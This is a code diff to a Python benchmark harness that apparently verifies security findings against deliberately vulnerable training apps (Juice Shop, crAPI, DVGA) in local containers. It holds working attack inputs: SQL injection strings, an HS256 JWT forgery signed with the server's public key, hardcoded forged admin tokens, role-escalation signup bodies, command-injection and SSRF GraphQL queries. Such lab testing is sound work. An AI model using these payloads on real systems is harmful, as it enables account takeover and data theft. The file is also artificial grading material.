@@ -1,7 +1,10 @@
 from __future__ import annotations
 
 import atexit
+import base64
 import contextlib
+import hashlib
+import hmac
 import json
 import os
 import subprocess
@@ -11,7 +14,7 @@ import urllib.request
 from collections.abc import Iterator
 from dataclasses import dataclass
 from pathlib import Path
-from urllib.parse import quote
+from urllib.parse import quote, urlencode
 
 from benchmark.harness.score import Finding
 from benchmark.matrix.registry import Cell
@@ -24,6 +27,21 @@ _VAMPI_IMAGE = (
     "erev0s/vampi@sha256:"
     "0a5a224b6e14ae7da6a6ea265178ff71286ff903aec74adee98f660bb0e4ca12"
 )
+_DVGA_IMAGE = (
+    "dolevf/dvga@sha256:"
+    "040aa33c199d99f3380c9ff9a1ee5d725e9abca7b189c63a35a2a73bda79c957"
+)
+_CRAPI_ADMIN = (
+    "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCJ9."
+    "eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoyMDAwMDAwMDAwLCJyb2xlIjoiYWRtaW4ifQ."
+    "5sSq0kQ2_qv4LPpwtKjY2_651a7hHeJCNl6bBmmXx7g"
+)
+_DVGA_ADMIN = (
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
+    "eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU2ODE0OTQ4LCJuYmYiOjE2NTY4MTQ5NDgsImp0aSI6ImI5N2FmY2Qw"
+    "LTUzMjctNGFmNi04YTM3LTRlMjdjODY5MGE2YyIsImlkZW50aXR5IjoiYWRtaW4iLCJleHAiOjE2NTY4MjIxNDh9."
+    "-56ZQN9jikpuuhpjHjy3vLvdwbtySs0mbdaSq-9RVGg"
+)
 _JSON = (("Content-Type", "application/json"),)
 _PROJECT = "insidia-live"
 _XSS_PATH = (
@@ -33,11 +51,20 @@ _VAMPI_SQLI = "/users/v1/" + quote("nosuch' OR '1'='1", safe="")
 
 
 @dataclass(frozen=True)
+class Sidecar:
+    name: str
+    port: int
+    body: str
+
+
+@dataclass(frozen=True)
 class RunApp:
     name: str
     image: str
     container_port: int
     host_port: int
+    env: tuple[tuple[str, str], ...] = ()
+    sidecar: Sidecar | None = None
 
 
 @dataclass(frozen=True)
@@ -79,17 +106,95 @@ class BearerLogin:
     signup_body: bytes
     login_path: str
     login_body: bytes
+    token_at: tuple[str, ...] = ("token",)
+    # None accepts any signup status. Login is what has to succeed.
+    signup_ok: tuple[int, ...] | None = (200, 403)
+
+
+@dataclass(frozen=True)
+class PublicKeyHs256:
+    key_path: str
+    payload: bytes
+
+
+@dataclass(frozen=True)
+class BearerPost:
+    login: BearerLogin
+    method: str
+    path: str
+    body: bytes
+    headers: tuple[tuple[str, str], ...]
+
+
+@dataclass(frozen=True)
+class OwnedReport:
+    """A report owned by the seeded admin, read back by `reader`."""
+
+    reader: BearerLogin
+    owner_login: bytes
+    mechanic_code: str
+    problem: str
+
+
+@dataclass(frozen=True)
+class OwnedPost:
+    """A community post written by the seeded admin and read by `reader`."""
+
+    reader: BearerLogin
+    owner_login: bytes
 
 
 @dataclass(frozen=True)
 class LiveCase:
     app: RunApp | ComposeApp
     check: HttpCheck | DomCheck
-    setup: OnceGet | BearerLogin | None = None
+    setup: (
+        OnceGet
+        | BearerLogin
+        | PublicKeyHs256
+        | BearerPost
+        | OwnedReport
+        | OwnedPost
+        | None
+    ) = None
 
 
+def _graphql(query: str) -> bytes:
+    return json.dumps({"query": query}, separators=(",", ":")).encode()
+
+
+_UPLOAD_BOUNDARY = "insidiaform"
+_UPLOAD = (
+    f"--{_UPLOAD_BOUNDARY}\r\n"
+    'Content-Disposition: form-data; name="file"; filename="p.mp4"\r\n'
+    "Content-Type: video/mp4\r\n"
+    "\r\n"
+    "not-a-video\r\n"
+    f"--{_UPLOAD_BOUNDARY}--\r\n"
+).encode()
 _JUICE = RunApp("insidia-juice", _JUICE_IMAGE, 3000, 3000)
+_JUICE_BOLA = BearerLogin(
+    "/api/Users",
+    (
+        b'{"email":"insidia-bola@juice-sh.op","password":"Insidia1",'
+        b'"passwordRepeat":"Insidia1"}'
+    ),
+    "/rest/user/login",
+    b'{"email":"insidia-bola@juice-sh.op","password":"Insidia1"}',
+    ("authentication", "token"),
+    None,
+)
 _VAMPI = RunApp("insidia-vampi", _VAMPI_IMAGE, 5000, 5000)
+# The image listens on 127.0.0.1 unless WEB_HOST is set, and the published port then resets.
+_DVGA = RunApp(
+    "insidia-dvga",
+    _DVGA_IMAGE,
+    5013,
+    5013,
+    (("WEB_HOST", "0.0.0.0"),),
+    # importPaste curls 127.0.0.1 inside this container's network namespace.
+    Sidecar("insidia-dvga-ssrf", 8765, "insidia-dvga-ssrf"),
+)
 _CRAPI = ComposeApp(
     "crapi",
     8888,
@@ -110,6 +215,16 @@ _CRAPI = ComposeApp(
     8080,
     "insidia-ssrf-plant",
 )
+_CRAPI_ACCESS = BearerLogin(
+    "/identity/api/auth/signup",
+    (
+        b'{"name":"Insidia Plant","email":"insidia-access@example.com",'
+        b'"number":"8888888881","password":"Insidia1"}'
+    ),
+    "/identity/api/auth/login",
+    b'{"email":"insidia-access@example.com","password":"Insidia1"}',
+)
+_BEARER = (("Authorization", "Bearer {token}"),)
 
 _CHECKS: dict[tuple[str, str], LiveCase] = {
     ("juiceshop", "web.sqli"): LiveCase(
@@ -155,19 +270,190 @@ _CHECKS: dict[tuple[str, str], LiveCase] = {
             b'{"email":"insidia-ssrf@example.com","password":"Insidia1"}',
         ),
     ),
+    ("juiceshop", "api.bola_idor"): LiveCase(
+        _JUICE,
+        HttpCheck("GET", "/rest/basket/1", None, _BEARER, "Apple Juice (1000ml)", 200),
+        _JUICE_BOLA,
+    ),
+    # Each proof has to see 201, and Juice Shop will only create a given email once.
+    ("juiceshop", "api.bfla"): LiveCase(
+        _JUICE,
+        HttpCheck(
+            "POST",
+            "/api/Users",
+            (
+                b'{"email":"insidia-role-plant-{seq}@juice-sh.op","password":"Insidia1",'
+                b'"passwordRepeat":"Insidia1","role":"admin"}'
+            ),
+            _JSON,
+            '"role":"admin"',
+            201,
+        ),
+    ),
+    ("juiceshop", "auth.jwt_oauth_session"): LiveCase(
+        _JUICE,
+        HttpCheck(
+            "GET",
+            "/rest/user/whoami",
+            None,
+            (("Cookie", "token={token}"),),
+            "rsa_lord@juice-sh.op",
+            200,
+        ),
+        PublicKeyHs256(
+            "/encryptionkeys/jwt.pub",
+            b'{"data":{"email":"rsa_lord@juice-sh.op","role":"admin"}}',
+        ),
+    ),
+    ("crapi", "api.bola_idor"): LiveCase(
+        _CRAPI,
+        HttpCheck(
+            "GET",
+            "/workshop/api/mechanic/mechanic_report?report_id={report_id}",
+            None,
+            _BEARER,
+            "admin@example.com",
+            200,
+        ),
+        OwnedReport(
+            _CRAPI_ACCESS,
+            b'{"email":"admin@example.com","password":"Admin!123"}',
+            "TRAC_JME",
+            "insidia-bola-plant",
+        ),
+    ),
+    ("crapi", "api.bfla"): LiveCase(
+        _CRAPI,
+        HttpCheck(
+            "GET",
+            "/community/api/v2/community/posts/recent",
+            None,
+            _BEARER,
+            "admin@example.com",
+            200,
+        ),
+        OwnedPost(
+            _CRAPI_ACCESS,
+            b'{"email":"admin@example.com","password":"Admin!123"}',
+        ),
+    ),
+    ("crapi", "api.mass_assignment"): LiveCase(
+        _CRAPI,
+        HttpCheck(
+            "PUT",
+            "/identity/api/v2/user/videos/1",
+            b'{"videoName":"plant","conversion_params":"insidia-mass"}',
+            (*_JSON, *_BEARER),
+            '"conversion_params":"insidia-mass"',
+            200,
+        ),
+        BearerPost(
+            _CRAPI_ACCESS,
+            "POST",
+            "/identity/api/v2/user/videos",
+            _UPLOAD,
+            (
+                ("Content-Type", f"multipart/form-data; boundary={_UPLOAD_BOUNDARY}"),
+                *_BEARER,
+            ),
+        ),
+    ),
+    ("crapi", "auth.jwt_oauth_session"): LiveCase(
+        _CRAPI,
+        HttpCheck(
+            "GET",
+            "/identity/api/v2/user/dashboard",
+            None,
+            (("Authorization", f"Bearer {_CRAPI_ADMIN}"),),
+            "ROLE_ADMIN",
+            200,
+        ),
+    ),
+    ("dvga", "web.sqli"): LiveCase(
+        _DVGA,
+        HttpCheck(
+            "POST",
+            "/graphql",
+            _graphql('{ pastes(filter:"aaa \' or 1=1--") { content title } }'),
+            _JSON,
+            "My First Paste",
+            200,
+        ),
+    ),
+    ("dvga", "web.cmdi"): LiveCase(
+        _DVGA,
+        HttpCheck(
+            "POST",
+            "/graphql",
+            _graphql('{ systemDebug(arg:"-ef") }'),
+            _JSON,
+            "ps -ef",
+            200,
+        ),
+    ),
+    ("dvga", "web.ssrf"): LiveCase(
+        _DVGA,
+        HttpCheck(
+            "POST",
+            "/graphql",
+            _graphql(
+                'mutation { importPaste(host:"127.0.0.1", port:8765, path:"/plant", '
+                'scheme:"http") { result } }'
+            ),
+            _JSON,
+            "insidia-dvga-ssrf",
+            200,
+        ),
+    ),
+    ("dvga", "api.bola_idor"): LiveCase(
+        _DVGA,
+        HttpCheck(
+            "POST",
+            "/graphql",
+            _graphql("{ paste(id:1) { id title content public } }"),
+            _JSON,
+            "My First Paste",
+            200,
+        ),
+    ),
+    ("dvga", "api.bfla"): LiveCase(
+        _DVGA,
+        HttpCheck(
+            "POST",
+            "/graphql",
+            _graphql("{ users { username } }"),
+            _JSON,
+            '"username":"admin"',
+            200,
+        ),
+    ),
+    ("dvga", "auth.jwt_oauth_session"): LiveCase(
+        _DVGA,
+        HttpCheck(
+            "POST",
+            "/graphql",
+            _graphql(f'{{ me(token: "{_DVGA_ADMIN}") {{ username password }} }}'),
+            _JSON,
+            "changeme",
+            200,
+        ),
+    ),
 }
 
 _STARTED: list[str] = []
 _COMPOSE: tuple[Path, str] | None = None
 _HOST_PORT: dict[str, int] = {}
 _ONCE: set[str] = set()
-_TOKEN: dict[str, str] = {}
+_POSTED: set[tuple[str, str]] = set()
+_SEQ = 0
+_TOKEN: dict[tuple[str, BearerLogin | PublicKeyHs256], str] = {}
+_REPORT_ID = ""
 _PROVED: dict[tuple[str, str, str], bool] = {}
 
 
 def live_ready(cell: Cell) -> bool:
     return (
-        cell.phase == "1B"
+        cell.phase in {"1B", "1C"}
         and cell.box in {"black", "gray"}
         and cell.conn in {"direct", "tunnel"}
         and (cell.target, cell.attack) in _CHECKS
@@ -212,7 +498,7 @@ def _matches(check: HttpCheck | DomCheck, port: int, token: str | None) -> bool:
     if isinstance(check, DomCheck):
         return _dom(port, check)
     status, body = _exchange(port, check.method, check.path, check.body, check.headers, token)
-    return status == check.status and check.marker in body
+    return status == check.status and check.marker in body.decode("utf-8", "replace")
 
 
 def _prepare(case: LiveCase, port: int) -> str | None:
@@ -220,17 +506,138 @@ def _prepare(case: LiveCase, port: int) -> str | None:
     if isinstance(setup, OnceGet):
         if case.app.name not in _ONCE:
             _status, body = _exchange(port, "GET", setup.path, None, (), None)
-            if setup.marker not in body:
+            if setup.marker not in body.decode("utf-8", "replace"):
                 raise RuntimeError(f"{setup.path} missing {setup.marker}")
             _ONCE.add(case.app.name)
         return None
-    if isinstance(setup, BearerLogin):
-        cached = _TOKEN.get(case.app.name)
-        if cached is None:
-            cached = _bearer(port, setup)
-            _TOKEN[case.app.name] = cached
-        return cached
+    if isinstance(setup, BearerLogin | PublicKeyHs256):
+        return _token_for(port, case.app.name, setup)
+    if isinstance(setup, BearerPost):
+        token = _token_for(port, case.app.name, setup.login)
+        _post_once(port, case.app.name, setup, token)
+        return token
+    if isinstance(setup, OwnedReport):
+        return _owned_report(port, setup)
+    if isinstance(setup, OwnedPost):
+        _owned_post(port, setup)
+        return _token_for(port, case.app.name, setup.reader)
     return None
+
+
+def _owned_post(port: int, setup: OwnedPost) -> None:
+    """A fresh community database has no posts until its seed finds the authors."""
+    status, body = _exchange(
+        port,
+        "POST",
+        setup.reader.login_path,
+        setup.owner_login,
+        _JSON,
+        None,
+    )
+    if status != 200:
+        raise RuntimeError(f"admin login returned {status}: {_text(body)}")
+    owner = _at(json.loads(body), setup.reader.token_at)
+    title = f"insidia-bfla-{time.time_ns()}"
+    payload = json.dumps({"title": title, "content": "insidia-bfla-body"}).encode()
+    deadline = time.monotonic() + 45
+    last = ""
+    while time.monotonic() < deadline:
+        status, body = _exchange(
+            port,
+            "POST",
+            "/community/api/v2/community/posts",
+            payload,
+            (*_JSON, ("Authorization", f"Bearer {owner}")),
+            None,
+        )
+        if status == 200 and title.encode() in body:
+            return
+        last = _text(body)
+        time.sleep(1)
+    raise RuntimeError(f"community post returned no title: {last}")
+
+
+def _owned_report(port: int, setup: OwnedReport) -> str:
+    """Fresh crAPI has no mechanic report until workshop sees a vehicle."""
+    global _REPORT_ID
+    token = _token_for(port, "crapi", setup.reader)
+    status, body = _exchange(
+        port,
+        "POST",
+        setup.reader.login_path,
+        setup.owner_login,
+        _JSON,
+        None,
+    )
+    if status != 200:
+        raise RuntimeError(f"admin login returned {status}: {_text(body)}")
+    owner = _at(json.loads(body), setup.reader.token_at)
+    vin = _admin_vin(port, owner)
+    query = urlencode(
+        {
+            "mechanic_code": setup.mechanic_code,
+            "problem_details": setup.problem,
+            "vin": vin,
+        }
+    )
+    deadline = time.monotonic() + 45
+    last = ""
+    report_id: object = None
+    while time.monotonic() < deadline:
+        status, body = _exchange(
+            port,
+            "GET",
+            f"/workshop/api/mechanic/receive_report?{query}",
+            None,
+            (),
+            None,
+        )
+        if status == 200:
+            report_id = json.loads(body).get("id")
+            if isinstance(report_id, int):
+                break
+        last = _text(body)
+        time.sleep(1)
+    else:
+        raise RuntimeError(f"receive_report returned no id: {last}")
+    _REPORT_ID = str(report_id)
+    return token
+
+
+def _admin_vin(port: int, owner: str) -> str:
+    deadline = time.monotonic() + 45
+    last = ""
+    auth = (("Authorization", f"Bearer {owner}"),)
+    while time.monotonic() < deadline:
+        status, body = _exchange(
+            port,
+            "GET",
+            "/identity/api/v2/vehicle/vehicles",
+            None,
+            auth,
+            None,
+        )
+        if status == 200:
+            rows = json.loads(body)
+            if isinstance(rows, list) and rows and isinstance(rows[0], dict):
+                vin = rows[0].get("vin")
+                if isinstance(vin, str) and vin:
+                    return vin
+        last = _text(body)
+        time.sleep(1)
+    raise RuntimeError(f"admin vehicle missing: {last}")
+
+
+def _token_for(port: int, app: str, setup: BearerLogin | PublicKeyHs256) -> str:
+    key = (app, setup)
+    cached = _TOKEN.get(key)
+    if cached is None:
+        if isinstance(setup, BearerLogin):
+            cached = _bearer(port, setup)
+        else:
+            cached = _public_key_hs256(port, setup)
+        _TOKEN[key] = cached
+    return cached
 
 
 def _bearer(port: int, setup: BearerLogin) -> str:
@@ -242,8 +649,8 @@ def _bearer(port: int, setup: BearerLogin) -> str:
         _JSON,
         None,
     )
-    if status not in {200, 403}:
-        raise RuntimeError(f"signup returned {status}: {body[:300]}")
+    if setup.signup_ok is not None and status not in setup.signup_ok:
+        raise RuntimeError(f"signup returned {status}: {_text(body)}")
     status, body = _exchange(
         port,
         "POST",
@@ -253,12 +660,59 @@ def _bearer(port: int, setup: BearerLogin) -> str:
         None,
     )
     if status != 200:
-        raise RuntimeError(f"login returned {status}: {body[:300]}")
-    payload = json.loads(body)
-    token = payload.get("token") if isinstance(payload, dict) else None
-    if not isinstance(token, str) or token == "":
+        raise RuntimeError(f"login returned {status}: {_text(body)}")
+    return _at(json.loads(body), setup.token_at)
+
+
+def _public_key_hs256(port: int, setup: PublicKeyHs256) -> str:
+    status, key = _exchange(port, "GET", setup.key_path, None, (), None)
+    if status != 200 or key == b"":
+        raise RuntimeError(f"{setup.key_path} returned {status}")
+    return _sign_hs256(key, setup.payload)
+
+
+def _sign_hs256(key: bytes, payload: bytes) -> str:
+    header = b'{"alg":"HS256","typ":"JWT"}'
+    signing = _b64(header) + b"." + _b64(payload)
+    digest = hmac.new(key, signing, hashlib.sha256).digest()
+    return (signing + b"." + _b64(digest)).decode()
+
+
+def _b64(data: bytes) -> bytes:
+    return base64.urlsafe_b64encode(data).rstrip(b"=")
+
+
+def _at(payload: object, path: tuple[str, ...]) -> str:
+    current = payload
+    for key in path:
+        if not isinstance(current, dict) or key not in current:
+            raise RuntimeError("login returned no token")
+        current = current[key]
+    if not isinstance(current, str) or current == "":
         raise RuntimeError("login returned no token")
-    return token
+    return current
+
+
+def _post_once(port: int, app: str, setup: BearerPost, token: str) -> None:
+    key = (app, setup.path)
+    if key in _POSTED:
+        return
+    status, body = _exchange(port, setup.method, setup.path, setup.body, setup.headers, token)
+    if status >= 400:
+        raise RuntimeError(f"{setup.path} returned {status}: {_text(body)}")
+    _POSTED.add(key)
+
+
+def _text(body: bytes) -> str:
+    return body[:300].decode("utf-8", "replace")
+
+
+def _plant(body: bytes | None) -> bytes | None:
+    if body is None or b"{seq}" not in body:
+        return body
+    global _SEQ
+    _SEQ += 1
+    return body.replace(b"{seq}", f"{time.time_ns()}-{_SEQ}".encode())
 
 
 def _exchange(
@@ -268,7 +722,7 @@ def _exchange(
     body: bytes | None,
     headers: tuple[tuple[str, str], ...],
     token: str | None,
-) -> tuple[int, str]:
+) -> tuple[int, bytes]:
     rendered: dict[str, str] = {}
     for key, value in headers:
         if "{token}" in value:
@@ -276,17 +730,21 @@ def _exchange(
                 raise RuntimeError(f"{path} needs a token")
             value = value.replace("{token}", token)
         rendered[key] = value
+    if "{report_id}" in path:
+        if _REPORT_ID == "":
+            raise RuntimeError(f"{path} needs a report id")
+        path = path.replace("{report_id}", _REPORT_ID)
     request = urllib.request.Request(
         f"http://127.0.0.1:{port}{path}",
-        data=body,
+        data=_plant(body),
         headers=rendered,
         method=method,
     )
     try:
         with urllib.request.urlopen(request, timeout=10) as response:
-            return int(response.status), response.read().decode("utf-8", "replace")
+            return int(response.status), response.read()
     except urllib.error.HTTPError as exc:
-        return int(exc.code), exc.read().decode("utf-8", "replace")
+        return int(exc.code), exc.read()
 
 
 def _dom(port: int, check: DomCheck) -> bool:
@@ -302,22 +760,31 @@ def _dom(port: int, check: DomCheck) -> bool:
 
 
 def _chrome(url: str) -> subprocess.CompletedProcess[str]:
-    return subprocess.run(
-        [
-            "google-chrome",
-            "--headless=new",
-            "--disable-gpu",
-            "--no-sandbox",
-            "--timeout=8000",
-            "--virtual-time-budget=5000",
-            "--dump-dom",
-            url,
-        ],
-        capture_output=True,
+    argv = [
+        "google-chrome",
+        "--headless=new",
+        "--disable-gpu",
+        "--no-sandbox",
+        "--timeout=8000",
+        "--virtual-time-budget=5000",
+        "--dump-dom",
+        url,
+    ]
+    proc = subprocess.Popen(
+        argv,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
         text=True,
-        timeout=30,
-        check=False,
     )
+    try:
+        stdout, stderr = proc.communicate(timeout=30)
+    except subprocess.TimeoutExpired:
+        proc.kill()
+        stdout, stderr = proc.communicate()
+        # The DOM is already in stdout. Chrome stays up on a slow tunnel.
+        code = 0 if stdout else -9
+        return subprocess.CompletedProcess(argv, code, stdout or "", stderr or "")
+    return subprocess.CompletedProcess(argv, proc.returncode or 0, stdout, stderr)
 
 
 def _ensure(app: RunApp | ComposeApp) -> int:
@@ -331,21 +798,25 @@ def _ensure_run(app: RunApp) -> int:
     if cached is not None:
         return cached
     if not _adopt_run(app):
-        if _inspect(app.name, "{{.State.Status}}") is not None:
-            _docker(["rm", "-f", app.name])
-        _docker(
-            [
-                "run",
-                "-d",
-                "--name",
-                app.name,
-                "-p",
-                f"127.0.0.1:{app.host_port}:{app.container_port}",
-                app.image,
-            ]
-        )
+        if app.sidecar is not None:
+            _remove(app.sidecar.name)
+        _remove(app.name)
+        command = [
+            "run",
+            "-d",
+            "--name",
+            app.name,
+            "-p",
+            f"127.0.0.1:{app.host_port}:{app.container_port}",
+        ]
+        for key, value in app.env:
+            command.extend(["-e", f"{key}={value}"])
+        command.append(app.image)
+        _docker(command)
         _STARTED.append(app.name)
     _wait_http(app.host_port, "/")
+    if app.sidecar is not None:
+        _ensure_sidecar(app)
     _HOST_PORT[app.name] = app.host_port
     return app.host_port
 
@@ -355,7 +826,70 @@ def _adopt_run(app: RunApp) -> bool:
         return False
     if _inspect(app.name, "{{.Image}}") != _image_id(app.image):
         return False
-    return _binding(app.name, app.container_port) == ("127.0.0.1", str(app.host_port))
+    if _binding(app.name, app.container_port) != ("127.0.0.1", str(app.host_port)):
+        return False
+    return _env_ok(app.name, app.env)
+
+
+def _env_ok(name: str, env: tuple[tuple[str, str], ...]) -> bool:
+    if not env:
+        return True
+    raw = _inspect(name, "{{json .Config.Env}}")
+    if raw is None:
+        return False
+    found = json.loads(raw)
+    if not isinstance(found, list):
+        return False
+    present = {str(item) for item in found}
+    return all(f"{key}={value}" in present for key, value in env)
+
+
+def _ensure_sidecar(app: RunApp) -> None:
+    sidecar = app.sidecar
+    if sidecar is None:
+        return
+    if _sidecar_ok(app, sidecar):
+        return
+    _remove(sidecar.name)
+    _docker(
+        [
+            "run",
+            "-d",
+            "--name",
+            sidecar.name,
+            "--network",
+            f"container:{app.name}",
+            "--entrypoint",
+            "python",
+            app.image,
+            "-c",
+            _listen_program(sidecar.port, sidecar.body),
+        ]
+    )
+    _STARTED.append(sidecar.name)
+    _wait_serves(sidecar.name, sidecar.port, sidecar.body)
+
+
+def _sidecar_ok(app: RunApp, sidecar: Sidecar) -> bool:
+    if _inspect(sidecar.name, "{{.State.Running}}") != "true":
+        return False
+    if not _joined(app.name, sidecar.name):
+        return False
+    return _serves(sidecar.name, sidecar.port, sidecar.body)
+
+
+def _joined(app: str, sidecar: str) -> bool:
+    mode = _inspect(sidecar, "{{.HostConfig.NetworkMode}}") or ""
+    if mode == f"container:{app}":
+        return True
+    app_id = _inspect(app, "{{.Id}}") or ""
+    bare = app_id.removeprefix("sha256:")
+    return mode in {f"container:{app_id}", f"container:{bare}"}
+
+
+def _remove(name: str) -> None:
+    if _inspect(name, "{{.State.Status}}") is not None:
+        _docker(["rm", "-f", name])
 
 
 def _ensure_compose(app: ComposeApp) -> int:
@@ -399,11 +933,11 @@ def _ensure_marker(app: ComposeApp, network: str) -> None:
             "python",
             app.marker_image,
             "-c",
-            _marker_program(app),
+            _listen_program(app.marker_port, app.marker_body),
         ]
     )
     _STARTED.append(app.marker_name)
-    _wait_marker(app)
+    _wait_serves(app.marker_name, app.marker_port, app.marker_body)
 
 
 def _marker_ok(app: ComposeApp, network: str) -> bool:
@@ -411,11 +945,11 @@ def _marker_ok(app: ComposeApp, network: str) -> bool:
         return False
     if network not in _networks(app.marker_name):
         return False
-    return _marker_serves(app)
+    return _serves(app.marker_name, app.marker_port, app.marker_body)
 
 
-def _marker_program(app: ComposeApp) -> str:
-    literal = json.dumps(app.marker_body)
+def _listen_program(port: int, body: str) -> str:
+    literal = json.dumps(body)
     return (
         "from http.server import BaseHTTPRequestHandler, HTTPServer\n"
         "class Handler(BaseHTTPRequestHandler):\n"
@@ -427,34 +961,34 @@ def _marker_program(app: ComposeApp) -> str:
         "        self.wfile.write(payload)\n"
         "    def log_message(self, fmt, *args):\n"
         "        return\n"
-        f'HTTPServer(("0.0.0.0", {app.marker_port}), Handler).serve_forever()\n'
+        f'HTTPServer(("0.0.0.0", {port}), Handler).serve_forever()\n'
     )
 
 
-def _marker_serves(app: ComposeApp) -> bool:
+def _serves(name: str, port: int, body: str) -> bool:
     code = (
         "import urllib.request\n"
         "body = urllib.request.urlopen("
-        f"'http://127.0.0.1:{app.marker_port}/plant', timeout=2).read().decode()\n"
+        f"'http://127.0.0.1:{port}/plant', timeout=2).read().decode()\n"
         "print(body)\n"
     )
     result = subprocess.run(
-        ["docker", "exec", app.marker_name, "python", "-c", code],
+        ["docker", "exec", name, "python", "-c", code],
         capture_output=True,
         text=True,
         timeout=10,
         check=False,
     )
-    return result.returncode == 0 and app.marker_body in result.stdout
+    return result.returncode == 0 and body in result.stdout
 
 
-def _wait_marker(app: ComposeApp) -> None:
+def _wait_serves(name: str, port: int, body: str) -> None:
     deadline = time.monotonic() + 20
     while time.monotonic() < deadline:
-        if _marker_serves(app):
+        if _serves(name, port, body):
             return
         time.sleep(0.2)
-    raise RuntimeError(f"{app.marker_name} did not serve {app.marker_body}")
+    raise RuntimeError(f"{name} did not serve {body}")
 
 
 def _down_foreign(compose_file: Path) -> None:
